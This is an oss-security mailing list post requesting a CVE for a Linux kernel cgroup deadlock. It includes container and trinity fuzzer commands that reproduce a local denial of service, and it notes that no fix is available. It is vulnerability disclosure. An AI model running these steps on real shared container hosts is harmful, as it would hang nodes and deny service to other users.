  oss-security - CVE request: linux kernel - local DoS with cgroup offline code            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Fri, 4 Nov (EDT) From: CAI Qian <caiqian@...hat.com> To: oss-security@...ts.openwall.com Subject: CVE request: linux kernel - local DoS with cgroup offline code  A malicious user who can run an arbitrary image with a non-privileged user in a Container-as-a-service cloud environment could use the exploit to deadlock the container nodes to deny the service for other users.  This is confirmed to affect the latest mainline kernel using this kernel config, and as old as RHEL 7.3 kernel is not affected.  # docker run -it caiqian/rhel-tools bash container> # su - test container> $ ulimit -c 0 container> $ trinity -D --disable-fds=memfd --disable-fds=timerfd \              --disable-fds=pipes --disable-fds=testfile \              --disable-fds=sockets --disable-fds=perf \              --disable-fds=epoll --disable-fds=eventfd \              --disable-fds=drm  After 30-minute, interrupt (Ctrl-C) all the trinity processes, and then,  container> $ exit container> # exit # systemctl status docker <hang...> # systemctl reboot Failed to start reboot.target: Connection timed out See system logs and 'systemctl status reboot.target' for details.  After a while, lots of hang tasks on the console, [ INFO: lockdep is turned off. [ INFO: task blocked for more than seconds. [       Tainted: G        W       #1 [ "echo 0 > /proc/sys/kernel/hung_task_timeout_secs" disables this message. [    D      2 [ Workqueue: cgroup_destroy css_killed_work_fn [  [  [  [ Call Trace: [  [  [  ? [  [  ? [  [  [  [  [  [  [  ? [  [  [  ? [  ? [  ? [  ? [  ? [  [  [  [  ? [  [  ? [  [  [  ?  Below is the full trace on ext4 (xfs also affected) and the sysrq-w report. http://people.redhat.com/qcai/tmp/dmesg-ext4-cgroup-hang  This has already been reported to cgroup maintainers a few weeks ago, and one of them mentioned that "cgroup is trying to offline a cpuset css, which takes place under cgroup_mutex.  The offlining ends up trying to drain active usages of a sysctl table which apprently is not happening." There is no fix at this time as far as I can tell.      CAI Qian  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      